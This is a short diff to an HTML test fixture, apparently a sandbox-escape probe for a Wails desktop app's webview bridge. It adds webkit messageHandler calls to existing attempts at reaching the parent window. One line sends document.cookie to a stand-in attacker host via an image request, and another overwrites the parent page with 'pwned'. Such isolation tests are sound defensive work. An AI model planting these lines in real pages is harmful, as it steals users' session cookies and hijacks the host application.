@@ -1,7 +1,10 @@
 <!doctype html><html><body><script>
 try { window.parent.wails.Call; } catch (e) {}
 try { window.top._wails.invoke('x'); } catch (e) {}
+try { window.top.webkit.messageHandlers.external.postMessage('x'); } catch (e) {}
+try { window.parent.webkit.messageHandlers.external.postMessage('x'); } catch (e) {}
 try { fetch('/wails/runtime'); } catch (e) {}
 try { parent.document.body.innerHTML = 'pwned'; } catch (e) {}
 try { new Image().src = 'https://attacker.invalid/?c=' + document.cookie; } catch (e) {}
+document.title = 'ran';
 </script></body></html>
